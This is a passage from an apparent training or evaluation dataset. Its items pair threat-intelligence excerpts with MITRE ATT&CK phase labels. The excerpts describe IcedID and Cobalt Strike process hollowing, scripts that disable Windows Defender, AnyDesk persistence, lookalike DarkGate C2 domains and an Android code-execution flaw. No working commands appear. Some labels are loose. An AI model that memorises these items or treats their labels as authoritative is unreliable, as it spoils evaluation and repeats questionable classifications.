        "input": "Described attack activity: Process Injection: Process Hollowing\nIcedID reached out to 37.120.222[.]100:8080 to download and load Cobalt Strike Beacon via process hollowing technique:\nKilling multiple Services and Disabling Security Tools\nThe threat actors executed a 1698 line batch scriptkasper.baton a file server, which kills multiple processes usingtaskill, stops/disables several services usingnet stopandsc configand disables a number of security tools usingWMI.\nHere is an extract from thekasper.batscript:\nDisabling Windows Defender using multiple techniques\nThe threat actors executed three other scripts namedfed1.bat,fed2.batandfed3.batusing PowerShell and manipulating several registry keys to disable Windows Defender.\nContent offed1.batscript:\nContent offed2.batscript:\nContent offed3.batscript:\nIt appears that the information from these 3 scripts were lifted from the first revision ofRevisions ` quick-disable-windows-defender.bat ` GitHub. Fed1 is half of that batch file and Fed2 is the other half. Fed3 is a complete copy. This tells us that the threat actor was not aware of what was in these scripts or else they wouldn't have ran fed1/fed2 and fed3 considering they do the same thing.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Although the weaknesses exploited in this attack had been exposed and patched nearly a decade ago, these attacks have remained continuously active worldwide. FortiGuard Labs discovered that \"FICORA\" and \"CAPSAICIN\" spread through this weakness. Because of this, it is crucial for every enterprise to regularly update the kernel of their devices and maintain comprehensive monitoring. These steps will help reduce the likelihood of malware being deployed through this vulnerability.\nFortinet Protections\nThe malware described in this report is detected and blocked byFortiGuard Antivirusas:\nELF/Gafgyt.ST!trELF/Gafgyt.C!trELF/Gafgyt.AEA!trBASH/TrojanDownloader.SH!trBASH/Mirai.AEH!tr.dldrELF/Mirai.A!trELF/Mirai.CTQ!trELF/Mirai.CLY!trBASH/Agent.SHS!tr.dldr\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected.\nTheFortiGuard Web Filtering Serviceblocks the C2 server.\nFortiGuard Labs provides IPS signature against attacks exploiting the following vulnerabilities:\nCVE-2015-2051: D-Link.Devices.HNAP.SOAPAction-Header.Command.ExecutionCVE-2019-10891: D-Link.Devices.HNAP.SOAPAction-Header.Command.ExecutionCVE-2022-37056: D-Link.Devices.HNAP.SOAPAction-Header.Command.ExecutionCVE-2024-33112: D-Link.Devices.HNAP.SOAPAction-Header.Command.Execution\nWe also suggest that organizations go through Fortinet'sfree cybersecurity trainingmodule:Fortinet Certified Fundamentals(FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks.\nFortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team.",
        "output": "other",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: A new local administrator user was created on a server to facilitate persistence on the machine. The user account was observed to be accessed via an AnyDesk session on the same machine.\nIn addition, AnyDesk was installed as a service:",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Judging from what we've seen so far, it seems like the author of DarkGate leveraged sophisticated techniques to avoid detection both by endpoint and network security products. \nThe malware contains six hard-coded domains, shown below, which it attempts to communicate with upon infection. It looks like the domains are chosen carefully to disguise the C&C server as a known legitimate service, such as Akamai CDN or AWS, and avoids looking suspicious to anyone who may be monitoring the network traffic. \nakamai.la   \nhardwarenet.cc ec2-14-122-45-127.compute-1.amazonaws.cdnprivate.tel awsamazon.cc battlenet.la a40-77-229-13.deploy.static.akamaitechnologies.pw \nAdditionally, it seems the author has employed another trick by using NS records that look like legitimate rDNS records from Akamai or Amazon. The idea behind using rDNS is that they're overlooked and easily dismissed by anyone monitoring network traffic. ",
        "output": "command and control",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Discovery commands were run by IcedID during the initial execution on the beachhead. These commands use the Microsoft Windows built-in commands and utilities, such as WMIC, ipconfig, etc. The aim was to determine the installed Anti-virus software, network configuration, domain configuration and user accounts. The following are the commands that were executed:\nUsing the information gathered, the IcedID operator was able to focus on specific targets, obtaining access to the privileged accounts and the high value hosts.\nOnce the IcedID operators were able to establish a C2 session to the initial compromised host, the operators were observed executing the following command:\nInterestingly, we observed the operator deploying and utilizing AdFind to collect information about the hosts on the network. AdFind is an Active Directory query tool developed byJoeWare, a useful utility for system administrators, but also  popular amongthreat actors.\nAdFind was transferred and executed on the beachhead host. The threat actor placed the AdFind binary and the results in the 'C:\\Recovery' folder. We assess this folder location was chosen to avoid raising suspicion, as compared to executing from a user or temporary folder location.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon initial compromise, UNC3944 is known to search for documentation on topics such as: user provisioning, MFA and/or device registration, network diagrams, and shared credentials in documents or spreadsheets. \nUNC3944 will also use network reconnaissance tools like ADRecon, ADExplorer, and SharpHound. Therefore, organizations should: \nEnsure any sites or portals that include these documents have access restrictions to only required accounts.   \nSweep for documents and spreadsheets that may contain shared credentials and remove them.   \nImplement alerting rules on endpoints with EDR agents for possible execution of known reconnaissance tools.   \nIf utilizing an Identity monitoring solution, ensure detection rules are enabled and alerts are created for any reconnaissance and discovery detections.   \nImplement an automated mechanism to continuously monitor domain registrations. Identify domains that mimic the organization's naming conventions, for instance:  [YourOrganizationName]- helpdesk.com  or [YourOrganizationName]- SSO.com . ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We identified this vulnerability pattern in the then-current versions of several Android applications published on the Google Play Store, including at least four with more than 500 million installations each. In each case, we responsibly disclosed to the vendor. Two example vulnerable applications that we identified are Xiaomi Inc.'s File Manager ( $^{1\\mathsf{B}+}$ installs) and WPS Office $^{\\prime}500\\mathsf{M}+$ installs). \nIn Xiaomi Inc.'s File Manager, we were able to obtain arbitrary code execution in version V1-210567. After our disclosure, Xiaomi published version V1-210593, and we verified that the vulnerability has been addressed. In WPS Office, we were able to obtain arbitrary code execution in version 16.8.1. After our disclosure, WPS published and informed us that the vulnerability has been addressed as of version 17.0.0. \nThe potential impact varies depending on implementation specifics. For example, it's very common for Android applications to read their server settings from the shared_prefs directory. In such cases, the malicious app can overwrite these settings, causing the vulnerable app to communicate with an attacker-controlled server and send the user's authentication tokens or other sensitive information. \nIn a worst-case (and not so uncommon) scenario, the vulnerable application might load native libraries from its data directory (as opposed to the more secure /data/app-lib directory, where the libraries are protected from modification). In this case, the malicious application can overwrite a native library with malicious code that gets executed when the library is loaded. In the following section, we use Xiaomi Inc.'s File Manager to illustrate this case. We demonstrated the ability for a malicious application to overwrite the application's shared preferences, write a native library to the application's internal storage, and cause the application to load the library. These actions provided arbitrary code execution with the file manager's user ID and permissions. \nIn the following sections, we focus on this case and delve into the technical details of this vulnerability pattern. ",
        "output": "impact",
        "source": "microsoft"
    }
]